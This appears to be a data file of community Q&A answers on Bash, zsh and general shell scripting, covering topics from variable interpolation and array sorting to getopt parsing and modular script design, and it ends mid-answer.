    "Variable interpolation in the shell": "Use\n\"$filepath\"_newstap.sh\nor\n${filepath}_newstap.sh\nor\n$filepath\\_newstap.sh\n_ is a valid character in identifiers. Dot is not, so the shell tried to interpolate $filepath_newstap.\nYou can use set -u to make the shell exit with an error when you reference an undefined variable.",
    "Where to place $PATH variable assertions in zsh?": "tl;dr version: use ~/.zshrc\nAnd read the man page to understand the differences between:\n~/.zshrc, ~/.zshenv and ~/.zprofile.\nRegarding my comment\nIn my comment attached to the answer kev gave, I said:\nThis seems to be incorrect - /etc/profile isn't listed in any zsh documentation I can find.\nThis turns out to be partially incorrect: /etc/profile may be sourced by zsh. However, this only occurs if zsh is \"invoked as sh or ksh\"; in these compatibility modes:\nThe usual zsh startup/shutdown scripts are not executed. Login shells source /etc/profile followed by $HOME/.profile. If the ENV environment variable is set on invocation, $ENV is sourced after the profile scripts. The value of ENV is subjected to parameter expansion, command substitution, and arithmetic expansion before being interpreted as a pathname. [man zshall, \"Compatibility\"].\nThe ArchWiki ZSH link says:\nAt login, Zsh sources the following files in this order:\n/etc/profile\nThis file is sourced by all Bourne-compatible shells upon login\nThis implys that /etc/profile is always read by zsh at login - I haven't got any experience with the Arch Linux project; the wiki may be correct for that distribution, but it is not generally correct. The information is incorrect compared to the zsh manual pages, and doesn't seem to apply to zsh on OS X (paths in $PATH set in /etc/profile do not make it to my zsh sessions).\n\nTo address the question:\nwhere exactly should I be placing my rvm, python, node etc additions to my $PATH?\nGenerally, I would export my $PATH from ~/.zshrc, but it's worth having a read of the zshall man page, specifically the \"STARTUP/SHUTDOWN FILES\" section - ~/.zshrc is read for interactive shells, which may or may not suit your needs - if you want the $PATH for every zsh shell invoked by you (both interactive and not, both login and not, etc), then ~/.zshenv is a better option.\nIs there a specific file I should be using (i.e. .zshenv which does not currently exist in my installation), one of the ones I am currently using, or does it even matter?\nThere's a bunch of files read on startup (check the linked man pages), and there's a reason for that - each file has it's particular place (settings for every user, settings for user-specific, settings for login shells, settings for every shell, etc).\nDon't worry about ~/.zshenv not existing - if you need it, make it, and it will be read.\n.bashrc and .bash_profile are not read by zsh, unless you explicitly source them from ~/.zshrc or similar; the syntax between bash and zsh is not always compatible. Both .bashrc and .bash_profile are designed for bash settings, not zsh settings.",
    "How to get the last character of a string in a shell?": "Per @perreal, quoting variables is important, but because I read this post like five times before finding a simpler approach to the question at hand in the comments...\nstr='abcd/'\necho \"${str: -1}\"\n=> /\nAlternatively use ${str:0-1} as pointed out in the comments.\nstr='abcd*'\necho \"${str:0-1}\"\n=> *\nNote: The extra space in ${str: -1} is necessary, otherwise ${str:-1} would result in 1 being taken as the default value if str is null or empty.\n${parameter:-word}\n       Use Default Values.  If parameter is unset or null, the\n       expansion of word is substituted.  Otherwise, the value of\n       parameter is substituted.\nThanks to everyone who participated in the above; I've appropriately added +1's throughout the thread!",
    "Returning value from called function in a shell script": "A Bash function can't return a string directly like you want it to. You can do three things:\nEcho a string\nReturn an exit status, which is a number, not a string\nShare a variable\nThis is also true for some other shells.\nHere's how to do each of those options:\n1. Echo strings\nlockdir=\"somedir\"\ntestlock(){\n    retval=\"\"\n    if mkdir \"$lockdir\"\n    then # Directory did not exist, but it was created successfully\n         echo >&2 \"successfully acquired lock: $lockdir\"\n         retval=\"true\"\n    else\n         echo >&2 \"cannot acquire lock, giving up on $lockdir\"\n         retval=\"false\"\n    fi\n    echo \"$retval\"\n}\n\nretval=$( testlock )\nif [ \"$retval\" == \"true\" ]\nthen\n     echo \"directory not created\"\nelse\n     echo \"directory already created\"\nfi\n2. Return exit status\nlockdir=\"somedir\"\ntestlock(){\n    if mkdir \"$lockdir\"\n    then # Directory did not exist, but was created successfully\n         echo >&2 \"successfully acquired lock: $lockdir\"\n         retval=0\n    else\n         echo >&2 \"cannot acquire lock, giving up on $lockdir\"\n         retval=1\n    fi\n    return \"$retval\"\n}\n\ntestlock\nretval=$?\nif [ \"$retval\" == 0 ]\nthen\n     echo \"directory not created\"\nelse\n     echo \"directory already created\"\nfi\n3. Share variable\nlockdir=\"somedir\"\nretval=-1\ntestlock(){\n    if mkdir \"$lockdir\"\n    then # Directory did not exist, but it was created successfully\n         echo >&2 \"successfully acquired lock: $lockdir\"\n         retval=0\n    else\n         echo >&2 \"cannot acquire lock, giving up on $lockdir\"\n         retval=1\n    fi\n}\n\ntestlock\nif [ \"$retval\" == 0 ]\nthen\n     echo \"directory not created\"\nelse\n     echo \"directory already created\"\nfi",
    "Run a string as a command within a Bash script": "You can use eval to execute a string:\neval $illcommando\nIf your command string needs to be evaluated itself before it is ran - wrap in quotes:\neval \"$yourcommand\"\n# e.g. eval \"command argument  --your-option='$(date -d \"$date\" +%Y-%m-%d)'\"",
    "How to find directory of some command?": "If you're using Bash or zsh, use this:\ntype -a lshw\nThis will show whether the target is a builtin, a function, an alias or an external executable. If the latter, it will show each place it appears in your PATH.\nbash$ type -a lshw\nlshw is /usr/bin/lshw\nbash$ type -a ls\nls is aliased to `ls --color=auto'\nls is /bin/ls\nbash$ zsh\nzsh% type -a which\nwhich is a shell builtin\nwhich is /usr/bin/which\nIn Bash, for functions type -a will also display the function definition. You can use declare -f functionname to do the same thing (you have to use that for zsh, since type -a doesn't).",
    "Raise error in a Bash script": "This depends on where you want the error message be stored.\nYou can do the following:\necho \"Error!\" > logfile.log\nexit 125\nOr the following:\necho \"Error!\" 1>&2\nexit 64\nWhen you raise an exception you stop the program's execution.\nYou can also use something like exit xxx where xxx is the error code you may want to return to the operating system (from 0 to 255). Here 125 and 64 are just random codes you can exit with. When you need to indicate to the OS that the program stopped abnormally (eg. an error occurred), you need to pass a non-zero exit code to exit.\nAs @chepner pointed out, you can do exit 1, which will mean an unspecified error.",
    "Checking for the correct number of arguments": "#!/bin/sh\nif [ \"$#\" -ne 1 ] || ! [ -d \"$1\" ]; then\n  echo \"Usage: $0 DIRECTORY\" >&2\n  exit 1\nfi\nTranslation: If number of arguments is not (numerically) equal to 1 or the first argument is not a directory, output usage to stderr and exit with a failure status code.\nMore friendly error reporting:\n#!/bin/sh\nif [ \"$#\" -ne 1 ]; then\n  echo \"Usage: $0 DIRECTORY\" >&2\n  exit 1\nfi\nif ! [ -e \"$1\" ]; then\n  echo \"$1 not found\" >&2\n  exit 1\nfi\nif ! [ -d \"$1\" ]; then\n  echo \"$1 not a directory\" >&2\n  exit 1\nfi",
    "How do I delete/remove a shell function?": "unset -f z\nWill unset the function named z. A couple people have answered with:\nunset z\nbut if you have a function and a variable named z only the variable will be unset, not the function.",
    "Hexadecimal To Decimal in Shell Script": "To convert from hex to decimal, there are many ways to do it in the shell or with an external program:\nWith\nbash\n:\n$ echo $((16#FF))\n255\nwith\nbc\n:\n$ echo \"ibase=16; FF\" | bc\n255\nwith\nperl\n:\n$ perl -le 'print hex(\"FF\");'\n255\nwith\nprintf\n:\n$ printf \"%d\\n\" 0xFF\n255\nwith\npython\n:\n$ python -c 'print(int(\"FF\", 16))'\n255\nwith\nruby\n:\n$ ruby -e 'p \"FF\".to_i(16)'\n255\nwith\nnode.js\n:\n$ node -e \"console.log(parseInt('FF', 16))\"\n255\nwith\nrhino\n:\n$ rhino -e \"print(parseInt('FF', 16))\"\n255\nwith\ngroovy\n:\n$ groovy -e 'println Integer.parseInt(\"FF\",16)'\n255",
    "Bash script processing limited number of commands in parallel": "Use the wait built-in:\nprocess1 &\nprocess2 &\nprocess3 &\nprocess4 &\nwait\nprocess5 &\nprocess6 &\nprocess7 &\nprocess8 &\nwait\nFor the above example, 4 processes process1 ... process4 would be started in the background, and the shell would wait until those are completed before starting the next set.\nFrom the GNU manual:\nwait [jobspec or pid ...]\nWait until the child process specified by each process ID pid or job specification jobspec exits and return the exit status of the last command waited for. If a job spec is given, all processes in the job are waited for. If no arguments are given, all currently active child processes are waited for, and the return status is zero. If neither jobspec nor pid specifies an active child process of the shell, the return status is 127.",
    "How to sort an array in Bash": "You don't really need all that much code:\nIFS=$'\\n' sorted=($(sort <<<\"${array[*]}\"))\nunset IFS\nSupports whitespace in elements (as long as it's not a newline), and works in Bash 3.x.\ne.g.:\n$ array=(\"a c\" b f \"3 5\")\n$ IFS=$'\\n' sorted=($(sort <<<\"${array[*]}\")); unset IFS\n$ printf \"[%s]\\n\" \"${sorted[@]}\"\n[3 5]\n[a c]\n[b]\n[f]\nNote: @sorontar has pointed out that care is required if elements contain wildcards such as * or ?:\nThe sorted=($(...)) part is using the \"split and glob\" operator. You should turn glob off: set -f or set -o noglob or shopt -op noglob or an element of the array like * will be expanded to a list of files.\nWhat's happening:\nThe result is a culmination six things that happen in this order:\nIFS=$'\\n'\n\"${array[*]}\"\n<<<\nsort\nsorted=($(...))\nunset IFS\nFirst, the IFS=$'\\n'\nThis is an important part of our operation that affects the outcome of 2 and 5 in the following way:\nGiven:\n\"${array[*]}\" expands to every element delimited by the first character of IFS\nsorted=() creates elements by splitting on every character of IFS\nIFS=$'\\n' sets things up so that elements are expanded using a new line as the delimiter, and then later created in a way that each line becomes an element. (i.e. Splitting on a new line.)\nDelimiting by a new line is important because that's how sort operates (sorting per line). Splitting by only a new line is not-as-important, but is needed preserve elements that contain spaces or tabs.\nThe default value of IFS is a space, a tab, followed by a new line, and would be unfit for our operation.\nNext, the sort <<<\"${array[*]}\" part\n<<<, called here strings, takes the expansion of \"${array[*]}\", as explained above, and feeds it into the standard input of sort.\nWith our example, sort is fed this following string:\na c\nb\nf\n3 5\nSince sort sorts, it produces:\n3 5\na c\nb\nf\nNext, the sorted=($(...)) part\nThe $(...) part, called command substitution, causes its content (sort <<<\"${array[*]}) to run as a normal command, while taking the resulting standard output as the literal that goes where ever $(...) was.\nIn our example, this produces something similar to simply writing:\nsorted=(3 5\na c\nb\nf\n)\nsorted then becomes an array that's created by splitting this literal on every new line.\nFinally, the unset IFS\nThis resets the value of IFS to the default value, and is just good practice.\nIt's to ensure we don't cause trouble with anything that relies on IFS later in our script. (Otherwise we'd need to remember that we've switched things around--something that might be impractical for complex scripts.)",
    "How to force 'cp' to overwrite directory instead of creating another one inside?": "You can do this using -T option in cp.\nSee Man page for cp.\n-T, --no-target-directory\n    treat DEST as a normal file\nSo as per your example, following is the file structure.\n$ tree test\ntest\n|-- bar\n|   |-- a\n|   `-- b\n`-- foo\n    |-- a\n    `-- b\n2 directories, 4 files\nYou can see the clear difference when you use -v for Verbose.\nWhen you use just -R option.\n$ cp -Rv foo/ bar/\n`foo/' -> `bar/foo'\n`foo/b' -> `bar/foo/b'\n`foo/a' -> `bar/foo/a'\n $ tree\n |-- bar\n |   |-- a\n |   |-- b\n |   `-- foo\n |       |-- a\n |       `-- b\n `-- foo\n     |-- a\n     `-- b\n3 directories, 6 files\nWhen you use the option -T it overwrites the contents, treating the destination like a normal file and not directory.\n$ cp -TRv foo/ bar/\n`foo/b' -> `bar/b'\n`foo/a' -> `bar/a'\n\n$ tree\n|-- bar\n|   |-- a\n|   `-- b\n`-- foo\n    |-- a\n    `-- b\n2 directories, 4 files\nThis should solve your problem.",
    "Bash/sh - difference between && and ;": "If previous command failed with ; the second one will run.\nBut with && the second one will not run.\nThis is a \"lazy\" logical \"AND\" operand between operations.",
    "Loop through a comma-separated shell variable": "Not messing with IFS\nNot calling external command\nvariable=abc,def,ghij\nfor i in ${variable//,/ }\ndo\n    # call your procedure/other scripts here below\n    echo \"$i\"\ndone\nUsing bash string manipulation http://www.tldp.org/LDP/abs/html/string-manipulation.html",
    "How can I execute PHP code from the command line?": "",
    "How to remove all .svn directories from my application directories": "Try this:\nfind . -name .svn -exec rm -rf '{}' \\;\nBefore running a command like that, I often like to run this first:\nfind . -name .svn -exec ls '{}' \\;",
    "Which terminal command to get just IP address and nothing else?": "You can write a script that only return the IP like:\n/sbin/ifconfig eth0 | grep 'inet addr' | cut -d: -f2 | awk '{print $1}'\nFor MAC:\nifconfig | grep \"inet \" | grep -v 127.0.0.1 | cut -d\\  -f2\nOr for linux system\nhostname -i | awk '{print $3}' # Ubuntu \n\nhostname -i # Debian",
    "How to do multiline shell script in Ansible": "Ansible uses YAML syntax in its playbooks. YAML has a number of block operators:\nThe > is a folding block operator. That is, it joins multiple lines together by spaces. The following syntax:\n  key: >\n    This text\n    has multiple\n    lines\nWould assign the value This text has multiple lines\\n to key.\nThe | character is a literal block operator. This is probably what you want for multi-line shell scripts. The following syntax:\n  key: |\n    This text\n    has multiple\n    lines\nWould assign the value This text\\nhas multiple\\nlines\\n to key.\nYou can use this for multiline shell scripts like this:\n- name: iterate user groups\n  shell: |\n    groupmod -o -g {{ item['guid'] }} {{ item['username'] }} \n    do_some_stuff_here\n    and_some_other_stuff\n  with_items: \"{{ users }}\"\n(Update in 2024: the following is no longer true; Ansible is now less janky.)\nThere is one caveat: Ansible does some janky manipulation of arguments to the shell command, so while the above will generally work as expected, the following won't:\n- shell: |\n    cat <<EOF\n    This is a test.\n    EOF\nAnsible will actually render that text with leading spaces, which means the shell will never find the string EOF at the beginning of a line. You can avoid Ansible's unhelpful heuristics by using the cmd parameter like this:\n- shell:\n    cmd: |\n      cat <<EOF\n      This is a test.\n      EOF\n@JKLaiho points out in a comment that the behavior of > is perhaps unexpected if you include additional indentation in your string. If you write:\nkey: >\n  this\n    is\n      a\n        test\nYou will get the value:\n\"this\\n  is\\n    a\\n      test\\n\"",
    "How to ssh to vagrant without actually running \"vagrant ssh\"?": "There's a lot of answers already, but they all seem overly complicated or solve problems the asker didn't have.\nsimply:\n# save the config to a file\nvagrant ssh-config > vagrant-ssh\n\n# run ssh with the file.\nssh -F vagrant-ssh default",
    "Fast Linux file count for a large number of files": "By default ls sorts the names, which can take a while if there are a lot of them. Also there will be no output until all of the names are read and sorted. Use the ls -f option to turn off sorting.\nls -f | wc -l\nNote: This will also enable -a, so ., .., and other files starting with . will be counted.",
    "What is the use case of noop [:] in bash?": "It's there more for historical reasons. The colon builtin : is exactly equivalent to true. It's traditional to use true when the return value is important, for example in an infinite loop:\nwhile true; do\n  echo 'Going on forever'\ndone\nIt's traditional to use : when the shell syntax requires a command but you have nothing to do.\nwhile keep_waiting; do\n  : # busy-wait\ndone\nThe : builtin dates all the way back to the Thompson shell, it was present in Unix v6. : was a label indicator for the Thompson shell's goto statement. The label could be any text, so : doubled up as a comment indicator (if there is no goto comment, then : comment is effectively a comment). The Bourne shell didn't have goto but kept :.\nA common idiom that uses : is : ${var=VALUE}, which sets var to VALUE if it was unset and does nothing if var was already set. This construct only exists in the form of a variable substitution, and this variable substitution needs to be part of a command somehow: a no-op command serves nicely.\nSee also What purpose does the colon builtin serve?.",
    "Worth switching to zsh for casual use? [closed]": "Personally, I love zsh.\nGenerally, you probably won't notice the difference between it and bash, until you want to quickly do things like recursive globbing:\n**/*.c for example.\nOr use suffix aliases to associate specific progs with different suffixes, so that you can \"execute\" them directly. The below alias lets you \"run\" a C source file at the prompt by simply typing ./my_program.c \u2013 which will work exactly as if you typed vim ./my_program.c. (Sort of the equivalent to double clicking on the icon of a file.)\nalias -s c=vim\nOr print the names of files modified today:\nprint *(e:age today now:)\nYou can probably do all of these things in bash, but my experience with zsh is that if there's something I want to do, I can probably find it in zsh-lovers. I also find the book 'From Bash to Z-Shell' really useful.\nPlaying with the mind bogglingly large number of options is good fun too!",
    "Execute and get the output of a shell command in node.js": "This is the method I'm using in a project I am currently working on.\nvar exec = require('child_process').exec;\nfunction execute(command, callback){\n    exec(command, function(error, stdout, stderr){ callback(stdout); });\n};\nExample of retrieving a git user:\nmodule.exports.getGitUser = function(callback){\n    execute(\"git config --global user.name\", function(name){\n        execute(\"git config --global user.email\", function(email){\n            callback({ name: name.replace(\"\\n\", \"\"), email: email.replace(\"\\n\", \"\") });\n        });\n    });\n};",
    "Why is $$ returning the same id as the parent process?": "$$ is defined to return the process ID of the parent in a subshell; from the man page under \"Special Parameters\":\n$ Expands to the process ID of the shell. In a () subshell, it expands to the process ID of the current shell, not the subshell.\nIn bash 4, you can get the process ID of the child with BASHPID.\n~ $ echo $$\n17601\n~ $ ( echo $$; echo $BASHPID )\n17601\n17634",
    "\"No such file or directory\" but it exists": "This error can mean that ./arm-mingw32ce-g++ doesn't exist (but it does), or that it exists and is a dynamically linked executable recognized by the kernel but whose dynamic loader is not available. You can see what dynamic loader is required by running ldd /arm-mingw32ce-g++; anything marked not found is the dynamic loader or a library that you need to install.\nIf you're trying to run a 32-bit binary on an amd64 installation:\nUp to Ubuntu 11.04, install the package ia32-libs.\nOn Ubuntu 11.10, install ia32-libs-multiarch.\nStarting with 12.04, install ia32-libs-multiarch, or select a reasonable set of :i386 packages in addition to the :amd64 packages.",
    "Relative paths based on file location instead of current working directory [duplicate]": "What you want to do is get the absolute path of the script (available via ${BASH_SOURCE[0]}) and then use this to get the parent directory and cd to it at the beginning of the script.\n#!/bin/bash\nparent_path=$( cd \"$(dirname \"${BASH_SOURCE[0]}\")\" ; pwd -P )\n\ncd \"$parent_path\"\ncat ../some.text\nThis will make your shell script work independent of where you invoke it from. Each time you run it, it will be as if you were running ./cat.sh inside dir.\nNote that this script only works if you're invoking the script directly (i.e. not via a symlink), otherwise the finding the current location of the script gets a little more tricky)",
    "While loop stops reading after the first line in Bash": "The problem is that do_work.sh runs ssh commands and by default ssh reads from stdin which is your input file. As a result, you only see the first line processed, because the command consumes the rest of the file and your while loop terminates.\nThis happens not just for ssh, but for any command that reads stdin, including mplayer, ffmpeg, HandBrakeCLI, httpie, brew install, and more.\nTo prevent this, pass the -n option to your ssh command to make it read from /dev/null instead of stdin. Other commands have similar flags, or you can universally use < /dev/null.",
    "Is there a Unix utility to prepend timestamps to stdin?": "ts from moreutils will prepend a timestamp to every line of input you give it. You can format it using strftime too.\n$ echo 'foo bar baz' | ts\nMar 21 18:07:28 foo bar baz\n$ echo 'blah blah blah' | ts '%F %T'\n2012-03-21 18:07:30 blah blah blah\n$ \nTo install it:\nsudo apt-get install moreutils",
    "How do you tell if a string contains another string in POSIX sh?": "Here's yet another solution. This uses POSIX substring parameter expansion, so it works in Bash, Dash, KornShell (ksh), Z shell (zsh), etc. It also supports special characters in strings.\ntest \"${string#*\"$word\"}\" != \"$string\" && echo \"$word found in $string\"\nA functionalized version with some tests:\n# contains(string, substring)\n#\n# Returns 0 if the specified string contains the specified substring,\n# otherwise returns 1.\ncontains() {\n    string=\"$1\"\n    substring=\"$2\"\n    if [ \"${string#*\"$substring\"}\" != \"$string\" ]; then\n        return 0    # $substring is in $string\n    else\n        return 1    # $substring is not in $string\n    fi\n}\n\ntestcontains() {\n    testnum=\"$1\"\n    expected=\"$2\"\n    string=\"$3\"\n    substring=\"$4\"\n    contains \"$string\" \"$substring\"\n    result=$?\n    if [ $result -eq $expected ]; then\n        echo \"test $testnum passed\"\n    else\n        echo \"test $testnum FAILED: string=<$string> substring=<$substring> result=<$result> expected=<$expected>\"\n    fi\n}\n\ntestcontains  1 1 'abcd' 'e'\ntestcontains  2 0 'abcd' 'ab'\ntestcontains  3 0 'abcd' 'bc'\ntestcontains  4 0 'abcd' 'cd'\ntestcontains  5 0 'abcd' 'abcd'\ntestcontains  6 1 '' 'a'\ntestcontains  7 0 'abcd efgh' 'cd ef'\ntestcontains  8 0 'abcd efgh' ' '\ntestcontains  9 1 'abcdefgh' ' '\ntestcontains 10 0 'abcd [efg] hij' '[efg]'\ntestcontains 11 1 'abcd [efg] hij' '[effg]'\ntestcontains 12 0 'abcd *efg* hij' '*efg*'\ntestcontains 13 0 'abcd *efg* hij' 'd *efg* h'\ntestcontains 14 1 'abcd *efg* hij' '*effg*'\ntestcontains 15 1 'abcd *efg* hij' '\\effg\\'\ntestcontains 16 0 'a\\b' '\\'\ntestcontains 17 0 '\\' '\\'\ntestcontains 18 1 '[' '\\'\ntestcontains 19 1 '\\' '['\ntestcontains 20 0 '-n' 'n'\ntestcontains 21 1 'n' '-n'\ntestcontains 22 0 '*\\`[]' '\\`'",
    "Command substitution: backticks or dollar sign / paren enclosed? [duplicate]": "There are several questions/issues here, so I'll repeat each section of the poster's text, block-quoted, and followed by my response.\nWhat's the preferred syntax, and why? Or are they pretty much interchangeable?\nI would say that the $(some_command) form is preferred over the `some_command` form. The second form, using a pair of backquotes (the \"`\" character, also called a backtick and a grave accent), is the historical way of doing it. The first form, using dollar sign and parentheses, is a newer POSIX form, which means it's probably a more standard way of doing it. In turn, I'd think that that means it's more likely to work correctly with different shells and with different *nix implementations.\nAnother reason given for preferring the first (POSIX) form is that it's easier to read, especially when command substitutions are nested. Plus, with the backtick form, the backtick characters have to be backslash-escaped in the nested (inner) command substitutions.\nWith the POSIX form, you don't need to do that.\nAs far as whether they're interchangeable, well, I'd say that, in general, they are interchangeable, apart from the exceptions you mentioned for escaped characters. However, I don't know and cannot say whether all modern shells and all modern *nixes support both forms. I doubt that they do, especially older shells/older *nixes. If I were you, I wouldn't depend on interchangeability without first running a couple of quick, simple tests of each form on any shell/*nix implementations that you plan to run your finished scripts on.\nI tend to favor the first, simply because my text editor seems to know what it is, and does syntax highlighting appropriately.\nIt's unfortunate that your editor doesn't seem to support the POSIX form; maybe you should check to see if there's an update to your editor that supports the POSIX way of doing it. Long shot maybe, but who knows? Or, maybe you should even consider trying a different editor.\nGGG, what text editor are you using???\nI read here that escaped characters act a bit differently in each case, but it's not clear to me which behavior is preferable, or if it just depends on the situation.\nI'd say that it depends on what you're trying to accomplish; in other words, whether you're using escaped characters along with command substitution or not.\nSide question: Is it bad practice to use both forms in one script, for example when nesting command substitutions?\nWell, it might make the script slightly easier to READ (typographically speaking), but harder to UNDERSTAND! Someone reading your script (or YOU, reading it six months later!) would likely wonder why you didn't just stick to one form or the other--unless you put some sort of note about why you did this in the comments. Plus, mixing both forms in one script would make that script less likely to be portable: In order for the script to work properly, the shell that's executing it has to support BOTH forms, not just one form or the other.\nFor making a shell script understandable, I'd personally prefer sticking to one form or the other throughout any one script, unless there's a good technical reason to do otherwise. Moreover, I'd prefer the POSIX form over the older form; again, unless there's a good technical reason to do otherwise.\nFor more on the topic of command substitution, and the two different forms for doing it, I suggest you refer to the section on command substitution in the O'Reilly book \"Classic Shell Scripting,\" second edition, by Robbins and Beebe. In that section, the authors state that the POSIX form for command substitution \"is recommended for all new development.\" I have no financial interest in this book; it's just one I have (and love) on shell scripting, though it's more for intermediate or advanced shell scripting, and not really for beginning shell scripting.\n-B.",
    "Executing Shell Scripts from the OS X Dock?": "You could create a Automator workflow with a single step - \"Run Shell Script\"\nThen File > Save As, and change the File Format to \"Application\". When you open the application, it will run the Shell Script step, executing the command, exiting after it completes.\nThe benefit to this is it's really simple to do, and you can very easily get user input (say, selecting a bunch of files), then pass it to the input of the shell script (either to stdin, or as arguments).\n(Automator is in your /Applications folder!)",
    "Design patterns or best practices for shell scripts [closed]": "I wrote quite complex shell scripts and my first suggestion is \"don't\". The reason is that is fairly easy to make a small mistake that hinders your script, or even make it dangerous.\nThat said, I don't have other resources to pass you but my personal experience. Here is what I normally do, which is overkill, but tends to be solid, although very verbose.\nInvocation\nmake your script accept long and short options. be careful because there are two commands to parse options, getopt and getopts. Use getopt as you face less trouble.\nCommandLineOptions__config_file=\"\"\nCommandLineOptions__debug_level=\"\"\n\ngetopt_results=`getopt -s bash -o c:d:: --long config_file:,debug_level:: -- \"$@\"`\n\nif test $? != 0\nthen\n    echo \"unrecognized option\"\n    exit 1\nfi\n\neval set -- \"$getopt_results\"\n\nwhile true\ndo\n    case \"$1\" in\n        --config_file)\n            CommandLineOptions__config_file=\"$2\";\n            shift 2;\n            ;;\n        --debug_level)\n            CommandLineOptions__debug_level=\"$2\";\n            shift 2;\n            ;;\n        --)\n            shift\n            break\n            ;;\n        *)\n            echo \"$0: unparseable option $1\"\n            EXCEPTION=$Main__ParameterException\n            EXCEPTION_MSG=\"unparseable option $1\"\n            exit 1\n            ;;\n    esac\ndone\n\nif test \"x$CommandLineOptions__config_file\" == \"x\"\nthen\n    echo \"$0: missing config_file parameter\"\n    EXCEPTION=$Main__ParameterException\n    EXCEPTION_MSG=\"missing config_file parameter\"\n    exit 1\nfi\nAnother important point is that a program should always return zero if completes successfully, non-zero if something went wrong.\nFunction calls\nYou can call functions in bash, just remember to define them before the call. Functions are like scripts, they can only return numeric values. This means that you have to invent a different strategy to return string values. My strategy is to use a variable called RESULT to store the result, and returning 0 if the function completed cleanly. Also, you can raise exceptions if you are returning a value different from zero, and then set two \"exception variables\" (mine: EXCEPTION and EXCEPTION_MSG), the first containing the exception type and the second a human readable message.\nWhen you call a function, the parameters of the function are assigned to the special vars $0, $1 etc. I suggest you to put them into more meaningful names. declare the variables inside the function as local:\nfunction foo {\n   local bar=\"$0\"\n}\nError prone situations\nIn bash, unless you declare otherwise, an unset variable is used as an empty string. This is very dangerous in case of typo, as the badly typed variable will not be reported, and it will be evaluated as empty. use\nset -o nounset\nto prevent this to happen. Be careful though, because if you do this, the program will abort every time you evaluate an undefined variable. For this reason, the only way to check if a variable is not defined is the following:\nif test \"x${foo:-notset}\" == \"xnotset\"\nthen\n    echo \"foo not set\"\nfi\nYou can declare variables as readonly:\nreadonly readonly_var=\"foo\"\nModularization\nYou can achieve \"python like\" modularization if you use the following code:\nset -o nounset\nfunction getScriptAbsoluteDir {\n    # @description used to get the script path\n    # @param $1 the script $0 parameter\n    local script_invoke_path=\"$1\"\n    local cwd=`pwd`\n\n    # absolute path ? if so, the first character is a /\n    if test \"x${script_invoke_path:0:1}\" = 'x/'\n    then\n        RESULT=`dirname \"$script_invoke_path\"`\n    else\n        RESULT=`dirname \"$cwd/$script_invoke_path\"`\n    fi\n}\n\nscript_invoke_path=\"$0\"\nscript_name=`basename \"$0\"`\ngetScriptAbsoluteDir \"$script_invoke_path\"\nscript_absolute_dir=$RESULT\n\nfunction import() { \n    # @description importer routine to get external functionality.\n    # @description the first location searched is the script directory.\n    # @description if not found, search the module in the paths contained in $SHELL_LIBRARY_PATH environment variable\n    # @param $1 the .shinc file to import, without .shinc extension\n    module=$1\n\n    if test \"x$module\" == \"x\"\n    then\n        echo \"$script_name : Unable to import unspecified module. Dying.\"\n        exit 1\n    fi\n\n    if test \"x${script_absolute_dir:-notset}\" == \"xnotset\"\n    then\n        echo \"$script_name : Undefined script absolute dir. Did you remove getScriptAbsoluteDir? Dying.\"\n        exit 1\n    fi\n\n    if test \"x$script_absolute_dir\" == \"x\"\n    then\n        echo \"$script_name : empty script path. Dying.\"\n        exit 1\n    fi\n\n    if test -e \"$script_absolute_dir/$module.shinc\"\n    then\n        # import from script directory\n        . \"$script_absolute_dir/$module.shinc\"\n    elif test \"x${SHELL_LIBRARY_PATH:-notset}\" != \"xnotset\"\n    then\n        # import from the shell script library path\n        # save the separator and use the ':' instead\n        local saved_IFS=\"$IFS\"\n        IFS=':'\n        for path in $SHELL_LIBRARY_PATH\n        do\n            if test -e \"$path/$module.shinc\"\n            then\n                . \"$path/$module.shinc\"\n                return\n            fi\n        done\n        # restore the standard separator\n        IFS=\"$saved_IFS\"\n    fi\n    echo \"$script_name : Unable to find module $module.\"\n    exit 1\n} \nyou can then import files with the extension .shinc with the following syntax\nimport \"AModule/ModuleFile\"\nWhich will be searched in SHELL_LIBRARY_PATH. As you always import in the global namespace, remember to prefix all your functions and variables with a proper prefix, otherwise you risk name clashes. I use double underscore as the python dot.\nAlso, put this as first thing in your module\n# avoid double inclusion\nif test \"${BashInclude__imported+defined}\" == \"defined\"\nthen\n    return 0\nfi\nBashInclude__imported=1\nObject oriented programming\nIn bash, you cannot do object oriented programming, unless you build a quite complex system of allocation of objects (I thought about that. it's feasible, but insane). In practice, you can however do \"Singleton oriented programming\": you have one instance of each object, and only one.\nWhat I do is: i define an object into a module (see the modularization entry). Then I define empty vars (analogous to member variables) an init function (constructor) and member functions, like in this example code\n# avoid double inclusion\nif test \"${Table__imported+defined}\" == \"defined\"\nthen\n    return 0\nfi\nTable__imported=1\n\nreadonly Table__NoException=\"\"\nreadonly Table__ParameterException=\"Table__ParameterException\"\nreadonly Table__MySqlException=\"Table__MySqlException\"\nreadonly Table__NotInitializedException=\"Table__NotInitializedException\"\nreadonly Table__AlreadyInitializedException=\"Table__AlreadyInitializedException\"\n\n# an example for module enum constants, used in the mysql table, in this case\nreadonly Table__GENDER_MALE=\"GENDER_MALE\"\nreadonly Table__GENDER_FEMALE=\"GENDER_FEMALE\"\n\n# private: prefixed with p_ (a bash variable cannot start with _)\np_Table__mysql_exec=\"\" # will contain the executed mysql command \n\np_Table__initialized=0\n\nfunction Table__init {\n    # @description init the module with the database parameters\n    # @param $1 the mysql config file\n    # @exception Table__NoException, Table__ParameterException\n\n    EXCEPTION=\"\"\n    EXCEPTION_MSG=\"\"\n    EXCEPTION_FUNC=\"\"\n    RESULT=\"\"\n\n    if test $p_Table__initialized -ne 0\n    then\n        EXCEPTION=$Table__AlreadyInitializedException   \n        EXCEPTION_MSG=\"module already initialized\"\n        EXCEPTION_FUNC=\"$FUNCNAME\"\n        return 1\n    fi\n\n\n    local config_file=\"$1\"\n\n      # yes, I am aware that I could put default parameters and other niceties, but I am lazy today\n      if test \"x$config_file\" = \"x\"; then\n          EXCEPTION=$Table__ParameterException\n          EXCEPTION_MSG=\"missing parameter config file\"\n          EXCEPTION_FUNC=\"$FUNCNAME\"\n          return 1\n      fi\n\n\n    p_Table__mysql_exec=\"mysql --defaults-file=$config_file --silent --skip-column-names -e \"\n\n    # mark the module as initialized\n    p_Table__initialized=1\n\n    EXCEPTION=$Table__NoException\n    EXCEPTION_MSG=\"\"\n    EXCEPTION_FUNC=\"\"\n    return 0\n\n}\n\nfunction Table__getName() {\n    # @description gets the name of the person \n    # @param $1 the row identifier\n    # @result the name\n    \n    EXCEPTION=\"\"\n    EXCEPTION_MSG=\"\"\n    EXCEPTION_FUNC=\"\"\n    RESULT=\"\"\n    \n    if test $p_Table__initialized 